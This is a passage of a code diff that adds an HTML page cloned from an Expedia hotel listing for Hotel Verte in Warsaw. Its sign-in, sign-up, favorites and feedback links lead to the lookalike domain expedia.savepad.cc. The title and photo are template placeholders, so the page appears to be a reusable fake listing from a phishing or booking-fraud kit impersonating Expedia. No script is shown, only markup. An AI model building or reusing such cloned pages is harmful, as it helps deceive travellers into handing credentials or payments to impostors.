iSY9QJxkcs9H-z7PteaqtgR3qZv9VSCdCoUxla3NhMlz5TcpEFAoMTWgtTswfeWy79m25tMrMAie5wOqhY-JmtuuzYG9jyScgRwsy2zcG5MiILpY6_qiGXPAQUQ6zqSxetf_Y82UyME23N9ZZx70EdA82dlUfe_J1hPa_7HE0iKcbEHJCSFWZhO0SncIl4IfvI_dyFIZCVLlS322V1Ej9qlQSRso9vMFpUwTxLCwWZyo2kJIB08uQTFC6KjIcCB2oNX4vqyV4CkxbzhpjwzYT9bQOILB9RNkunuwagPYe_00bjU1bH6qT5aryZ4hpOs7JTb2ze55QzCYosQdN0fkEgkO5WkMTHy5K50RDmSaHmjCr2lwePu07aW5IJWJvPj7bE81ykHIv_sHxD5VgjTbSUHtxUJf6Nz1AnMG-Khc6Hy0e8TKQfpu4yRTTVj1MwjWtbGbEvIqUAYenFEe1ApIhZAsS7T1mVqHKpk5xslVyNRW5VLiqd8Q-yIuU_6H1Lu4lYMjmkfX4m1OXz-hSKIo6qZchHyk1sSbTToNJNAt0w8uo%253D%26rank%3D1%26testVersionOverride%3DButtercup%252C45803.141433.0%252C44204.0.0%252C44203.0.0%252C43549.0.0%252C43550.0.0%252C31936.102311.0%252C33775.98848.1%252C38414.114301.0%252C39483.0.0%252C38427.115718.1%252C42444.0.0%252C42589.0.0%252C42876.124673.0%252C42973.0.0%252C42974.0.0%252C42975.0.0%252C42976.0.0%252C42802.125960.1%252C37899.109355.0%252C37930.0.0%252C37949.0.0%252C37354.113955.1%252C43435.128144.0%252C43153.133019.3%26slots%3D%26position%3D1%26beaconIssued%3D%26sort%3DRECOMMENDED%26top_dp%3D214%26top_cur%3DUSD%26userIntent%3D%26selectedRoomType%3D320747084%26selectedRatePlan%3D387159269"
+                          aria-label="Notifications">
+                          <button data-context="global_navigation" type="button"
+                            class="uitk-button uitk-button-large uitk-button-tertiary uitk-button-only-icon global-navigation-nav-button">
+                            <div
+                              class="uitk-layout-position uitk-layout-position-display-inline-block uitk-layout-position-relative">
+                              <svg class="uitk-icon uitk-icon-large" aria-hidden="true" viewBox="0 0 24 24"
+                                xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+                                <path fill-rule="evenodd"
+                                  d="M18 11v5l2 2v1H4v-1l2-2v-5c0-3.08 1.63-5.64 4.5-6.32V4a1.5 1.5 0 1 1 3 0v.68C16.36 5.36 18 7.93 18 11zm-4 9a2 2 0 1 1-4 0h4z"
+                                  clip-rule="evenodd"></path>
+                              </svg>
+                              <div
+                                class="uitk-badge-floating-dot-notification uitk-layout-position uitk-layout-position-right-zero uitk-layout-position-top-zero uitk-layout-position-absolute">
+                              </div>
+                            </div>
+                          </button>
+                        </a>
+                        <div
+                          class="uitk-layout-flex-item uitk-layout-flex-item-flex-basis-zero uitk-layout-flex-item-flex-grow-0 uitk-menu uitk-menu-mounted"
+                          id="">
+                          <button tabindex="0" aria-expanded="false" data-context="global_navigation" type="button"
+                            class="uitk-button uitk-button-large uitk-button-has-text uitk-button-tertiary uitk-menu-trigger global-navigation-nav-button">
+                            <div class="uitk-text uitk-type-300 uitk-text-default-theme">
+                              Sign in
+                            </div>
+                          </button>
+                          <div
+                            class="uitk-menu-container animation-disabled uitk-menu-pos-right uitk-menu-container-autoposition uitk-menu-container-has-intersection-root-el"
+                            aria-hidden="true" style="width: 375px;">
+                            <div>
+                              <div>
+                                <div data-stid="header-menu-illustration"
+                                  class="uitk-spacing uitk-spacing-padding-blockstart-six uitk-spacing-padding-blockend-three">
+                                  <div class="uitk-layout-flex uitk-layout-flex-justify-content-center">
+                                    <img
+                                      class="uitk-illustration uitk-layout-flex-item uitk-layout-flex-item-max-width-30x"
+                                      alt="Member discount illustration" src="./expedia_files/sparkle_white.svg">
+                                  </div>
+                                </div>
+                                <div
+                                  class="uitk-layout-flex uitk-layout-flex-align-items-flex-start uitk-layout-flex-flex-direction-column uitk-layout-flex-gap-one uitk-spacing uitk-spacing-padding-blockstart-three uitk-spacing-padding-blockend-six uitk-spacing-padding-inline-six">
+                                  <h2 class="uitk-heading uitk-heading-5 uitk-layout-flex-item">
+                                    Save an average of 15% on thousands of
+                                    hotels when you're signed in
+                                  </h2>
+                                </div>
+                                <div
+                                  class="uitk-spacing uitk-spacing-margin-inline-six uitk-spacing-margin-blockend-two">
+                                  <a href="https://expedia.savepad.cc/user/signin?ckoflag=0&amp;uurl=e3id%3Dredr%26rurl%3D%2FWarsaw-Hotels-Hotel-Verte.h83441056.Hotel-Information%3Fchkin%3D2023-06-06%26chkout%3D2023-06-07%26x_pwa%3D1%26rfrr%3DHSR%26pwa_ts%3D1684842497142%26referrerUrl%3DaHR0cHM6Ly93d3cuZXhwZWRpYS5jb20vSG90ZWwtU2VhcmNo%26useRewards%3Dfalse%26rm1%3Da2%26regionId%3D5718359%26destination%3DWarsaw%252C%2BPoland%2B%2528WAW-Frederic%2BChopin%2529%26destType%3DMARKET%26neighborhoodId%3D6141889%26latLong%3D52.170952%252C20.967527%26trackingData%3DAAAAAQAAAAEAAAAQfuiZf_jH6Ir6p9L1g4pTX8_aBQNrH2h4kz3JBdPG3UU0TiouJzmHJBpCn8PbGmtVyacPJecCUmoMMWlh_O-n2ngYZXhxl3sfdJFO4MquBhEHQDjOi6heEzYNI_CpDIzrBzpEqwASadpwBnvdaXmj4n9WkYhq5jSzQapKcH2-guIPL7QN9lPx4UPOj8JO0dZrf5W59dwtFHaYqrSjmD4aVdgP5ykVg1k29i3iTjOrtJSYSP11GxJAJfSuj_-reck4UBQizBo6ULyP-aYzCIQTzmB9glHue0fCZ1-SJOnF1UAhHxNnci7vw8ZMlT3W_9flDGQqWF9OhlL1-J_7lj9wGPWoXiFiNNb4MZyEA8zxWC-hmt80NhivA2zYd_xsOOXY4KiWS25OESqcMO_-m2NPYlfMJ4D9tzv8bo-pl8P6_VyJp5Sn3D6p4yYQ_8q6ycti2i_1WNlUFrX-rsvtYn9MzZYU8ZNkmm9e_8cpirSMkohckcfBWWa_DAyzm28tF6hu8xsncAidoOAsewIF6M3Ltx1_VZ0JnwIETY3oG_LapznKrioioLFcKQLG8qqQQmxiWHuVi_rkAnYetnA_gr6ksB3Hwq7H_fXDcRrF-rdKm9ctptAvpmw5yYfkjjoDaQ0GW_DfUrXpva2TNxMRv0bBmonDAzmTUb56nQQqMTTWfK9ENP_fcFehutMpP6wNG4e2lcRTumiNmGW8PrcX6DYPJSDNwYbvVrCC7d30IIroJlscxBw7WRWCFV1QXeRSp4_TGieZ3O-WKbMNRCPXukTFl4Ll3EZ0O07JscFQWnZ9ccxNhIpm7NWthGUdU3y5yfTxrL6fraijp943Vzi-5xcWFpjb2P5wmkMHaUzE88p__trF2TaTIqwF3mOVNbjxxLePZ-zKjBKhmP9id7oQUgcTURMjn9xtoFMnrDcvXE8XCHS2Eaq4-EVqkt8TL7rypk315FKFHHbtw5ZPF_-4b7ZXusJ9B89nznhF3nnhz5UNWofoLEd7BMWPLKJ0AVXeCV-SZeyEmPTaiJD5ywfs95O_NQyvxT-1nqEFa2KjuXIUEyVcmKYyG6LhgRIh8ZDm86Jy2tC9HIcF84r5oJLOpKOr0-rZnRydkw6cv544XrPBCUhP5nIK8DeOijhp-6m4IisBdEeNSfiiXtulrbP9hSAd0ea_-YgfKlP9GYIP0n0T8utFcODen-23p_L2lwbdRH1Mpa35MgkSs-VbHSXMsOuLYaMV9P0XFooAhRvXOs84cl6mOMrKEdj9n6m0Nu8shJamX2y9KPmch2HeLHBjl-OujUsQwn5N73oLhB0Hp5TJZzmu3z2FomppQMX93vCqVXW9skk_utHWa7owjNc0t4DTyHViXFa-grZAqsaF4kSHW1sPKEdpbV4GSh7tLDDdykgwO-HoJuRx-fq488E56rUukiWCo-AW_lFhBO0FFg3GHZsqYD4ZYnJbVuI-saYu95UMcDGEUVVVyvHky1lvG3kKddvittKUpmATznd3_nQXGZZIkLySw8MzW7cIoAQYfjrufRtNZmpprsD3-zuixIQOkKScmHUsO0VQ4_Oh0ixAxn5yNOWNCdd3N9ev3vbqUUZPi5vX9k73s6Z1sbByr4ir3kr8WIN36pVNAzmMILWVpC2EUmnBa1ELNdE06q2WRkjyuABgbTm7s2UAqduUFSdsfa3fEdnKWoTNjiPY9u6tjStCzgA7P5U17fzGYirS2rEQNB9C9lU-UnA6a7W4I1_tlRiXuDy_WMQnrMyTvS0pHZKPqXBQmCDHidbMr6uaFAGVSq19vZbm0M0JsAcQSaBtf2CKiWvSz4brAMtfpLfPVGCN_hO9s0lt-d_9NJL3i9iSY9QJxkcs9H-z7PteaqtgR3qZv9VSCdCoUxla3NhMlz5TcpEFAoMTWgtTswfeWy79m25tMrMAie5wOqhY-JmtuuzYG9jyScgRwsy2zcG5MiILpY6_qiGXPAQUQ6zqSxetf_Y82UyME23N9ZZx70EdA82dlUfe_J1hPa_7HE0iKcbEHJCSFWZhO0SncIl4IfvI_dyFIZCVLlS322V1Ej9qlQSRso9vMFpUwTxLCwWZyo2kJIB08uQTFC6KjIcCB2oNX4vqyV4CkxbzhpjwzYT9bQOILB9RNkunuwagPYe_00bjU1bH6qT5aryZ4hpOs7JTb2ze55QzCYosQdN0fkEgkO5WkMTHy5K50RDmSaHmjCr2lwePu07aW5IJWJvPj7bE81ykHIv_sHxD5VgjTbSUHtxUJf6Nz1AnMG-Khc6Hy0e8TKQfpu4yRTTVj1MwjWtbGbEvIqUAYenFEe1ApIhZAsS7T1mVqHKpk5xslVyNRW5VLiqd8Q-yIuU_6H1Lu4lYMjmkfX4m1OXz-hSKIo6qZchHyk1sSbTToNJNAt0w8uo%253D%26rank%3D1%26testVersionOverride%3DButtercup%252C45803.141433.0%252C44204.0.0%252C44203.0.0%252C43549.0.0%252C43550.0.0%252C31936.102311.0%252C33775.98848.1%252C38414.114301.0%252C39483.0.0%252C38427.115718.1%252C42444.0.0%252C42589.0.0%252C42876.124673.0%252C42973.0.0%252C42974.0.0%252C42975.0.0%252C42976.0.0%252C42802.125960.1%252C37899.109355.0%252C37930.0.0%252C37949.0.0%252C37354.113955.1%252C43435.128144.0%252C43153.133019.3%26slots%3D%26position%3D1%26beaconIssued%3D%26sort%3DRECOMMENDED%26top_dp%3D214%26top_cur%3DUSD%26userIntent%3D%26selectedRoomType%3D320747084%26selectedRatePlan%3D387159269"
+                                    target="_self" rel=""
+                                    class="uitk-button uitk-button-medium uitk-button-fullWidth uitk-button-has-text uitk-button-as-link uitk-button-primary">
+                                    Sign in
+                                  </a>
+                                </div>
+                                <div
+                                  class="uitk-spacing uitk-spacing-margin-inline-six uitk-spacing-margin-blockend-six">
+                                  <a href="https://expedia.savepad.cc/user/createaccount?%20&amp;uurl=e3id%3Dredr%26rurl%3D%2FWarsaw-Hotels-Hotel-Verte.h83441056.Hotel-Information%3Fchkin%3D2023-06-06%26chkout%3D2023-06-07%26x_pwa%3D1%26rfrr%3DHSR%26pwa_ts%3D1684842497142%26referrerUrl%3DaHR0cHM6Ly93d3cuZXhwZWRpYS5jb20vSG90ZWwtU2VhcmNo%26useRewards%3Dfalse%26rm1%3Da2%26regionId%3D5718359%26destination%3DWarsaw%252C%2BPoland%2B%2528WAW-Frederic%2BChopin%2529%26destType%3DMARKET%26neighborhoodId%3D6141889%26latLong%3D52.170952%252C20.967527%26trackingData%3DAAAAAQAAAAEAAAAQfuiZf_jH6Ir6p9L1g4pTX8_aBQNrH2h4kz3JBdPG3UU0TiouJzmHJBpCn8PbGmtVyacPJecCUmoMMWlh_O-n2ngYZXhxl3sfdJFO4MquBhEHQDjOi6heEzYNI_CpDIzrBzpEqwASadpwBnvdaXmj4n9WkYhq5jSzQapKcH2-guIPL7QN9lPx4UPOj8JO0dZrf5W59dwtFHaYqrSjmD4aVdgP5ykVg1k29i3iTjOrtJSYSP11GxJAJfSuj_-reck4UBQizBo6ULyP-aYzCIQTzmB9glHue0fCZ1-SJOnF1UAhHxNnci7vw8ZMlT3W_9flDGQqWF9OhlL1-J_7lj9wGPWoXiFiNNb4MZyEA8zxWC-hmt80NhivA2zYd_xsOOXY4KiWS25OESqcMO_-m2NPYlfMJ4D9tzv8bo-pl8P6_VyJp5Sn3D6p4yYQ_8q6ycti2i_1WNlUFrX-rsvtYn9MzZYU8ZNkmm9e_8cpirSMkohckcfBWWa_DAyzm28tF6hu8xsncAidoOAsewIF6M3Ltx1_VZ0JnwIETY3oG_LapznKrioioLFcKQLG8qqQQmxiWHuVi_rkAnYetnA_gr6ksB3Hwq7H_fXDcRrF-rdKm9ctptAvpmw5yYfkjjoDaQ0GW_DfUrXpva2TNxMRv0bBmonDAzmTUb56nQQqMTTWfK9ENP_fcFehutMpP6wNG4e2lcRTumiNmGW8PrcX6DYPJSDNwYbvVrCC7d30IIroJlscxBw7WRWCFV1QXeRSp4_TGieZ3O-WKbMNRCPXukTFl4Ll3EZ0O07JscFQWnZ9ccxNhIpm7NWthGUdU3y5yfTxrL6fraijp943Vzi-5xcWFpjb2P5wmkMHaUzE88p__trF2TaTIqwF3mOVNbjxxLePZ-zKjBKhmP9id7oQUgcTURMjn9xtoFMnrDcvXE8XCHS2Eaq4-EVqkt8TL7rypk315FKFHHbtw5ZPF_-4b7ZXusJ9B89nznhF3nnhz5UNWofoLEd7BMWPLKJ0AVXeCV-SZeyEmPTaiJD5ywfs95O_NQyvxT-1nqEFa2KjuXIUEyVcmKYyG6LhgRIh8ZDm86Jy2tC9HIcF84r5oJLOpKOr0-rZnRydkw6cv544XrPBCUhP5nIK8DeOijhp-6m4IisBdEeNSfiiXtulrbP9hSAd0ea_-YgfKlP9GYIP0n0T8utFcODen-23p_L2lwbdRH1Mpa35MgkSs-VbHSXMsOuLYaMV9P0XFooAhRvXOs84cl6mOMrKEdj9n6m0Nu8shJamX2y9KPmch2HeLHBjl-OujUsQwn5N73oLhB0Hp5TJZzmu3z2FomppQMX93vCqVXW9skk_utHWa7owjNc0t4DTyHViXFa-grZAqsaF4kSHW1sPKEdpbV4GSh7tLDDdykgwO-HoJuRx-fq488E56rUukiWCo-AW_lFhBO0FFg3GHZsqYD4ZYnJbVuI-saYu95UMcDGEUVVVyvHky1lvG3kKddvittKUpmATznd3_nQXGZZIkLySw8MzW7cIoAQYfjrufRtNZmpprsD3-zuixIQOkKScmHUsO0VQ4_Oh0ixAxn5yNOWNCdd3N9ev3vbqUUZPi5vX9k73s6Z1sbByr4ir3kr8WIN36pVNAzmMILWVpC2EUmnBa1ELNdE06q2WRkjyuABgbTm7s2UAqduUFSdsfa3fEdnKWoTNjiPY9u6tjStCzgA7P5U17fzGYirS2rEQNB9C9lU-UnA6a7W4I1_tlRiXuDy_WMQnrMyTvS0pHZKPqXBQmCDHidbMr6uaFAGVSq19vZbm0M0JsAcQSaBtf2CKiWvSz4brAMtfpLfPVGCN_hO9s0lt-d_9NJL3i9iSY9QJxkcs9H-z7PteaqtgR3qZv9VSCdCoUxla3NhMlz5TcpEFAoMTWgtTswfeWy79m25tMrMAie5wOqhY-JmtuuzYG9jyScgRwsy2zcG5MiILpY6_qiGXPAQUQ6zqSxetf_Y82UyME23N9ZZx70EdA82dlUfe_J1hPa_7HE0iKcbEHJCSFWZhO0SncIl4IfvI_dyFIZCVLlS322V1Ej9qlQSRso9vMFpUwTxLCwWZyo2kJIB08uQTFC6KjIcCB2oNX4vqyV4CkxbzhpjwzYT9bQOILB9RNkunuwagPYe_00bjU1bH6qT5aryZ4hpOs7JTb2ze55QzCYosQdN0fkEgkO5WkMTHy5K50RDmSaHmjCr2lwePu07aW5IJWJvPj7bE81ykHIv_sHxD5VgjTbSUHtxUJf6Nz1AnMG-Khc6Hy0e8TKQfpu4yRTTVj1MwjWtbGbEvIqUAYenFEe1ApIhZAsS7T1mVqHKpk5xslVyNRW5VLiqd8Q-yIuU_6H1Lu4lYMjmkfX4m1OXz-hSKIo6qZchHyk1sSbTToNJNAt0w8uo%253D%26rank%3D1%26testVersionOverride%3DButtercup%252C45803.141433.0%252C44204.0.0%252C44203.0.0%252C43549.0.0%252C43550.0.0%252C31936.102311.0%252C33775.98848.1%252C38414.114301.0%252C39483.0.0%252C38427.115718.1%252C42444.0.0%252C42589.0.0%252C42876.124673.0%252C42973.0.0%252C42974.0.0%252C42975.0.0%252C42976.0.0%252C42802.125960.1%252C37899.109355.0%252C37930.0.0%252C37949.0.0%252C37354.113955.1%252C43435.128144.0%252C43153.133019.3%26slots%3D%26position%3D1%26beaconIssued%3D%26sort%3DRECOMMENDED%26top_dp%3D214%26top_cur%3DUSD%26userIntent%3D%26selectedRoomType%3D320747084%26selectedRatePlan%3D387159269"
+                                    target="_self" rel="" data-context="global_navigation"
+                                    class="uitk-button uitk-button-medium uitk-button-fullWidth uitk-button-has-text uitk-button-as-link uitk-button-tertiary">
+                                    Sign up, it’s free
+                                  </a>
+                                </div>
+                                <div
+                                  class="uitk-layout-flex-item uitk-list uitk-layout-flex-item-flex-basis-zero uitk-layout-flex-item-flex-grow-0">
+                                  <a aria-label="List of favorites" data-stid="list-link"
+                                    href="https://expedia.savepad.cc/lists" target="_self" rel=""
+                                    class="uitk-link uitk-list-item uitk-link-align-left uitk-link-layout-default uitk-link-medium"
+                                    role="link">
+                                    <div class="uitk-text uitk-type-300 uitk-text-default-theme">
+                                      List of favorites
+                                    </div>
+                                  </a>
+                                </div>
+                                <hr
+                                  class="uitk-spacing uitk-spacing-margin-block-four uitk-spacing-border-blockstart uitk-spacing-hr">
+                                <div
+                                  class="uitk-layout-flex-item uitk-list uitk-layout-flex-item-flex-basis-zero uitk-layout-flex-item-flex-grow-0">
+                                  <a aria-label="Feedback" data-stid="support-feedback-link"
+                                    href="https://expedia.savepad.cc/p/info-other/feedback.htm" target="_blank"
+                                    rel="noopener"
+                                    class="uitk-link uitk-list-item uitk-link-align-left uitk-link-layout-default uitk-link-medium"
+                                    role="link">
+                                    <div class="uitk-text uitk-type-300 uitk-text-default-theme">
+                                      Feedback
+                                    </div>
+                                  </a>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </section>
+              </div>
+            </header>
+            <div id="main_content" class="visually-hidden">
+              Beginning of main content
+            </div>
+          </div>
+          <main>
+            <div class="uitk-spacing uitk-spacing-margin-medium-inline-six">
+              <div class="main-region">
+                <section class="" itemscope="" itemtype="https://schema.org/Hotel">
+                  <div class="constrain-width">
+                    <div class="uitk-layout-flex uitk-layout-flex-flex-direction-row-reverse">
+                      <div class="uitk-layout-flex-item uitk-layout-flex-item-flex-grow-1">
+                        <div
+                          class="uitk-layout-grid uitk-layout-grid-has-auto-columns uitk-layout-grid-has-columns uitk-layout-grid-display-grid"
+                          style="
+                              --uitk-layoutgrid-auto-columns: minmax(
+                                var(--uitk-layoutgrid-egds-size__0x),
+                                1fr
+                              );
+                              --uitk-layoutgrid-columns: repeat(
+                                3,
+                                minmax(0, 1fr)
+                              );
+                            ">
+                          <div class="uitk-layout-grid-item uitk-layout-grid-item-has-column-start"
+                            style="--uitk-layoutgrid-column-start: span 3;">
+                            <div
+                              class="uitk-card-content-section uitk-card uitk-card-roundcorner-all uitk-card-has-overflow uitk-flat-border-top uitk-flat-border-bottom uitk-card-has-primary-theme">
+                              <div
+                                class="uitk-spacing uitk-spacing-margin-blockstart-three uitk-spacing-padding-inline-two">
+                                <div>
+                                  <div class="uitk-spacing uitk-spacing-padding-blockstart-two"></div>
+                                </div>
+                              </div>
+                              <div class="uitk-spacing uitk-spacing-padding-block-two uitk-spacing-padding-inline-two">
+                                <div class="uitk-layout-flex uitk-layout-flex-align-items-center">
+                                  <div class="uitk-layout-flex-item uitk-layout-flex-item-flex-grow-1"></div>
+                                  <div data-stid="favorite-save-button">
+                                    <div
+                                      class="uitk-layout-flex uitk-layout-flex-align-items-center uitk-layout-flex-flex-direction-row">
+                                      <div class="uitk-favorite-switch">
+                                        <label class="uitk-favorite-switch-control" for="trip-save-item-q96">
+                                          <input class="uitk-layout-flex-item uitk-favorite-switch-input"
+                                            type="checkbox" name="trip-save-item-q96" id="trip-save-item-q96"
+                                            aria-label="Save property to a trip" value="">
+                                          <svg class="uitk-icon uitk-favorite-switch-fill uitk-icon-medium"
+                                            aria-hidden="true" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"
+                                            xmlns:xlink="http://www.w3.org/1999/xlink">
+                                            <path fill-rule="evenodd"
+                                              d="m12 22-8.44-8.69a5.55 5.55 0 0 1 0-7.72C4.53 4.59 5.9 4 7.28 4c1.4 0 2.75.59 3.72 1.59l1 1.02 1-1.02c.97-1 2.32-1.59 3.72-1.59 1.4 0 2.75.59 3.72 1.59a5.55 5.55 0 0 1 0 7.72L12 22Z"
+                                              clip-rule="evenodd"></path>
+                                          </svg><svg class="uitk-icon uitk-favorite-switch-border uitk-icon-medium"
+                                            aria-hidden="true" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"
+                                            xmlns:xlink="http://www.w3.org/1999/xlink">
+                                            <path fill-rule="evenodd"
+                                              d="m12 22 8.44-8.69a5.55 5.55 0 0 0 0-7.72A5.24 5.24 0 0 0 16.72 4 5.22 5.22 0 0 0 13 5.59L12 6.6l-1-1.02a5.2 5.2 0 0 0-7.44 0 5.55 5.55 0 0 0 0 7.72L12 22Zm0-2.87-7-7.21a3.55 3.55 0 0 1 0-4.94C5.6 6.36 6.44 6 7.28 6c.84 0 1.69.36 2.3.98L12 9.48l2.43-2.5c.6-.62 1.45-.98 2.29-.98.84 0 1.68.36 2.28.98a3.55 3.55 0 0 1 0 4.94l-7 7.2Z"
+                                              clip-rule="evenodd" opacity=".9"></path>
+                                          </svg>
+                                        </label>
+                                      </div>
+                                      <div
+                                        class="uitk-text uitk-type-300 uitk-text-white-space-nowrap uitk-text-default-theme uitk-spacing uitk-spacing-padding-inlineend-four"
+                                        data-stid="save-item-label">
+                                        Save
+                                      </div>
+                                    </div>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                          <div class="uitk-layout-grid-item uitk-layout-grid-item-has-column-start"
+                            style="--uitk-layoutgrid-column-start: span 3;">
+                            <div>
+                              <div id="Overview">
+                                <div
+                                  class="uitk-layout-position uitk-layout-position-zindex-layer1 uitk-layout-position-relative">
+                                  <h1 class="is-visually-hidden">
+                                    Th
+                                  </h1>
+                                  <meta itemprop="name" content="Th">
+                                  <div>
+                                    <div class="uitk-layout-position uitk-layout-position-relative">
+                                      <div
+                                        class="uitk-layout-grid uitk-layout-grid-has-auto-columns uitk-layout-grid-has-columns uitk-layout-grid-has-rows uitk-layout-grid-has-space uitk-layout-grid-display-grid"
+                                        style="
+                                            display: flex;
+                                            margin: 0 auto;
+                                            max-width: 450px;
+                                          ">
+                                        <h2 class="is-visually-hidden">
+                                          Photo gallery for Hotel Verte,
+                                          Warsaw, Autograph Collection
+                                        </h2>
+                                        <figure
+                                          class="uitk-image uitk-layout-grid-item uitk-layout-grid-item-has-column-start uitk-layout-grid-item-has-row-start uitk-image-ratio-16-9 uitk-image-ratio"
+                                          style="
+                                              --uitk-layoutgrid-column-start: span
+                                                2;
+                                              --uitk-layoutgrid-row-start: span
+                                                2;
+                                            ">
+                                          <div>
+                                            <div class="uitk-image-placeholder">
+                                              <img alt="Exterior" class="uitk-image-media" src="<%=ad.photo%>"
+                                                fetchpriority="high">
+                                            </div>
+                                            <button type="button" class="uitk-image-link">
+                                              <span class="is-visually-hidden">
+                                                <span class="is-visually-hidden">
+                                                  Exterior
+                                                </span>
+                                              </span>
+                                            </button>
+                                          </div>
+                                        </figure>
+                                      </div>
+                                    </div>
+                                  </div>
+                                  <h2 class="is-visually-hidden">
+                                    Overview of Hotel Verte, Warsaw, Autograph
+                                    Collection
+                                  </h2>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                          <div class="uitk-layout-grid-item uitk-layout-grid-item-has-column-start"
+                            style="--uitk-layoutgrid-column-start: span 3;">
+                            <div>
+                              <div
+                                class="uitk-card-content-section uitk-card-content-section-padded uitk-card uitk-card-roundcorner-all uitk-spacing uitk-flat-border-top uitk-spacing-margin-blockend-three uitk-spacing-padding-large-inline-six uitk-card-has-primary-theme">
+                                <div
+                                  class="uitk-layout-grid uitk-layout-grid-has-auto-columns uitk-layout-grid-has-columns uitk-layout-grid-has-columns-by-medium uitk-layout-grid-has-columns-by-large uitk-layout-grid-display-grid"
+                                  style="
+                                      display: flex;
+                                      justify-content: space-between;
+                                    ">
+                                  <div
+                                    class="uitk-layout-grid-item uitk-layout-grid-item-has-column-start uitk-layout-grid-item-has-column-start-by-medium uitk-layout-grid-item-has-column-start-by-large"
+                                    style="
+                                        --uitk-layoutgrid-column-start: span 1;
+                                        --uitk-layoutgrid-column-start-medium: span
+                                          1;
+                                        --uitk-layoutgrid-column-start-large: span
+                                          8;
+                                      ">
+                                    <div class="uitk-spacing uitk-spacing-padding-large-inlineend-three">
+                                      <div data-stid="content-hotel-title"
+                                        class="uitk-spacing uitk-spacing-padding-small-blockend-four uitk-spacing-padding-large-blockstart-three">
+                                        <div
+                                          class="uitk-layout-flex uitk-layout-flex-align-items-center uitk-layout-flex-gap-two uitk-spacing uitk-type-300 uitk-spacing-padding-blockend-two">
+                                        </div>
+                                        <h1 class="uitk-heading uitk-heading-3" aria-hidden="true">
+                                          <%=ad.title%>
+                                        </h1>
+                                        <div class="uitk-rating">
+                                          <span class="is-visually-hidden">
+                                            5.0 star property
+                                          </span>
+                                          <svg class="uitk-icon uitk-rating-icon uitk-icon-xsmall" aria-hidden="true"
+                                            viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"
+                                            xmlns:xlink="http://www.w3.org/1999/xlink">
+                                            <path
+                                              d="M12 17.27 18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27z">
+                                            </path>
+                                          </svg><svg class="uitk-icon uitk-rating-icon uitk-icon-xsmall"
+                                            aria-hidden="true" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"
+                                            xmlns:xlink="http://www.w3.org/1999/xlink">
+                                            <path
+                                              d="M12 17.27 18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27z">
+                                            </path>
+                                          </svg><svg class="uitk-icon uitk-rating-icon uitk-icon-xsmall"
+                                            aria-hidden="true" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"
+                                            xmlns:xlink="http://www.w3.org/1999/xlink">
+                                            <path
+                                              d="M12 17.27 18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27z">
+                                            </path>
+                                          </svg><svg class="uitk-icon uitk-rating-icon uitk-icon-xsmall"
+                                            aria-hidden="true" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"
+                                            xmlns:xlink="http://www.w3.org/1999/xlink">
+                                            <path
+                                              d="M12 17.27 18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27z">
+                                            </path>
+                                          </svg><svg class="uitk-icon uitk-rating-icon uitk-icon-xsmall"
+                                            aria-hidden="true" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"
+                                            xmlns:xlink="http://www.w3.org/1999/xlink">
+                                            <path
+                                              d="M12 17.27 18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27z">
+                                            </path>
+                                          </svg>
+                                        </div>
+                                      </div>
+                                      <div class="uitk-spacing uitk-spacing-padding-blockend-six"
+                                        data-stid="content-hotel-reviewsummary">
+                                        <div itemprop="aggregateRating" itemscope=""
+                                          itemtype="https://schema.org/AggregateRating">
+                                          <meta itemprop="ratingValue" content="9.3">
+                                          <meta itemprop="description" content="Exceptional">
+                                          <meta itemprop="reviewCount" content="15">
+                                        </div>
+                                        <div>
+                                          <div class="uitk-spacing uitk-spacing-padding-blockend-two">
+                                            <div
+                                              class="uitk-layout-grid uitk-layout-grid-has-auto-columns uitk-layout-grid-display-grid"
+                                              style="
+                                                  --uitk-layoutgrid-auto-columns: minmax(
+                                                    var(
+                                                      --uitk-layoutgrid-egds-size__0x
+                                                    ),
+                                                    1fr
+                                                  );
+                                                ">
+                                              <div
+                                                class="uitk-layout-flex uitk-layout-flex-align-items-center uitk-layout-grid-item">
+                                                <span class="is-visually-hidden">
+                                                  9.3 out of 10 Exceptional
+                                                </span>
+                                                <div>
+                                                  <div
+                                                    class="uitk-text uitk-type-500 uitk-type-bold uitk-text-default-theme">
+                                                    9.3/10 Exceptional
+                                                  </div>
+                                                </div>
+                                              </div>
+                                            </div>
+                                          </div>
+                                        </div>
+                                      </div>
+                                      <div class="uitk-spacing uitk-spacing-padding-blockend-six"
+                                        data-stid="hotel-amenities-list">
+                                        <div class="uitk-layout-flex uitk-layout-flex-flex-direction-column">
+                                          <div class="uitk-layout-flex uitk-layout-flex-align-items-flex-start">
+                                            <h3
+                                              class="uitk-heading uitk-heading-5 uitk-spacing uitk-spacing-padding-blockend-three">
+                                              Popular amenities
+                                            </h3>
+                                          </div>
+                                          <ul
+                                            class="uitk-typelist uitk-typelist-orientation-stacked uitk-typelist-size-2"
+                                            role="list">
+                                            <div
+                                              class="uitk-layout-grid uitk-layout-grid-has-auto-columns uitk-layout-grid-has-columns uitk-layout-grid-has-rows uitk-layout-grid-has-space uitk-layout-grid-display-grid"
+                                              style="
+                                                  --uitk-layoutgrid-auto-columns: minmax(
+                                                    var(
+                                                      --uitk-layoutgrid-egds-size__0x
+                                                    ),
+                                                    1fr
+                                                  );
+                                                  --uitk-layoutgrid-columns: repeat(
+                                                    2,
